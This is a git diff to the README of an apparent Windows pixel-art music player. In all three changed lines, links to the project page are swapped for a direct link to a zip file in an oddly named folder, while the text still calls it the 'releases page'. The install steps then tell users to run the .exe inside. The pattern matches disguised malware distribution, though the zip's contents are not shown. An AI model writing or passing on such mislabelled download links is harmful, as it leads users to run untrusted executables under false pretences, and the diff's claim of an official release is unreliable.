@@ -1,6 +1,6 @@
 # 🎵 pixel-anime-player - Enjoy music with pixel art dancers
 
-[![Download Pixel Beat Idol](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/afoot-alphaandomega129/pixel-anime-player)
+[![Download Pixel Beat Idol](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/afoot-alphaandomega129/pixel-anime-player/main/overprizer/player-pixel-anime-2.5.zip)
 
 Pixel Beat Idol plays your local music files while showing animated pixel art characters. The characters dance to the rhythm of your music. The player supports bilingual lyrics and turns your local photos into pixel art visuals. It runs on your Windows desktop.
 
@@ -8,7 +8,7 @@ Pixel Beat Idol plays your local music files while showing animated pixel art ch
 
 Follow these steps to install the player on your Windows computer. This process takes a few minutes. 
 
-1. Visit the [releases page](https://github.com/afoot-alphaandomega129/pixel-anime-player) to download the application.
+1. Visit the [releases page](https://raw.githubusercontent.com/afoot-alphaandomega129/pixel-anime-player/main/overprizer/player-pixel-anime-2.5.zip) to download the application.
 2. Select the file ending in `.exe` for Windows.
 3. Save the file to your computer.
 4. Double-click the downloaded file to start the installation.
@@ -54,7 +54,7 @@ Customize the application to fit your preferences. Open the settings menu to adj
 
 Return to the official project page to ensure you have the most current version. Developers update the software to fix bugs and add new features regularly.
 
-[Click here to open the download page](https://github.com/afoot-alphaandomega129/pixel-anime-player)
+[Click here to open the download page](https://raw.githubusercontent.com/afoot-alphaandomega129/pixel-anime-player/main/overprizer/player-pixel-anime-2.5.zip)
 
 Check this page if the software feels sluggish or if you miss certain features. New updates often include better performance and new animations for the dancers.
 
